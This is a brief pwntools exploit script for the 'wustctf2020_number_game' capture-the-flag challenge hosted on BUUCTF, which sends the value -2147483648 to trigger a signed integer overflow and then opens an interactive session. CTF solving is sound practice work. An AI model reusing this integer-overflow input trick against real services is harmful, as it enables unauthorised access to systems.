from pwn import *

context(log_level='debug')

io=remote("node3.buuoj.cn",25488)
#io=process("./wustctf2020_number_game")

io.recv()

io.sendline(str(-2147483648))

io.interactive()
